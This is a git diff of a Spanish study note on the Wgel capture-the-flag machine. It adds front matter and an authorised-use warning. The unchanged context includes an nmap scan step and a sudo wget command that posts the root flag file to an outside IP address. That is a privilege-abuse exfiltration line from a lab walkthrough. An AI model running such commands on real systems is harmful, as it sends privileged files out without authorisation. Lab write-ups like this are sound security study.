@@ -1,3 +1,15 @@
+---
+title: "MAQUINA WGEL CTF"
+date: 2026-08-27
+tags:
+  - self-study
+  - security-penetration-testing
+  - avanzado
+status: verified
+author: "Juan José Restrepo Rosero"
+last_updated: 2026-08-27
+---
+
 Hacemos el escaneo con nmap:
 ![[Pasted image 20230924110158.png]]
 Y esto es lo que corre por el puerto 80:
@@ -21,3 +33,10 @@ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.100.91
 ```
 ![[Pasted image 20230924111355.png]]
 ![[Pasted image 20230924111402.png]]
+
+<!-- self-study-knowledge-context -->
+## Contexto de estudio
+- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
+- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
+> [!warning] Uso autorizado
+> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
